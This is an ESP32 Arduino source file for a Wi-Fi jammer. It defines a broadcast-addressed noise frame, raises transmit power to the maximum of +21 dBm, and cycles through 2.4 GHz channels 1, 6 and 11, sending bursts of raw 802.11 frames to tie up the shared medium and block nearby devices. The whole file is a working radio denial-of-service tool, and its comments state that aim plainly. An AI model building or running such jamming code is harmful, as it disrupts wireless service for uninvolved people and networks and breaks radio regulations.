#include <Arduino.h>
#include "wifi_jammer.h"
#include "config.h"
#include "state.h"
#include "nvs_flash.h"
#include "esp_wifi.h"

// Broadcast-addressed noise frame — forces CSMA/CA wait on all nearby devices
static uint8_t noise_frame[] = {
    0x08, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination — broadcast
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Source — broadcast
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // BSSID — broadcast
    0x00, 0x00,
    0xDE, 0xAD, 0xBE, 0xEF,
    0xDE, 0xAD, 0xBE, 0xEF,
    0xDE, 0xAD, 0xBE, 0xEF
};

// Target channels — non-overlapping 2.4 GHz
static uint8_t channels[CHANNEL_COUNT] = {1, 6, 11};

void wifi_init() {
    esp_err_t ret = nvs_flash_init();

    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        nvs_flash_erase();
        nvs_flash_init();
    }

    esp_netif_init();
    esp_event_loop_create_default();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();

    // Max TX power — 84 = +21 dBm
    esp_wifi_set_max_tx_power(84);

    Serial.println("[*] Wi-Fi ready");
}

void jam_channel(uint8_t ch) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    Serial.print("[*] Jamming channel ");
    Serial.println(ch);

    for (int i = 0; i < BURST_SIZE; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, noise_frame, sizeof(noise_frame), false);
    }
}

void sweep_task(void* params) {
    int idx = 0;

    while (true) {
        if (jamming == true) {
            uint8_t ch       = channels[idx];
            uint32_t elapsed = 0;

            while (elapsed < DWELL_MS) {
                jam_channel(ch);
                vTaskDelay(10 / portTICK_PERIOD_MS);
                elapsed += 10;
            }

            idx = idx + 1;

            if (idx >= CHANNEL_COUNT) {
                idx = 0;
            }
        } else {
            vTaskDelay(100 / portTICK_PERIOD_MS);
        }
    }
}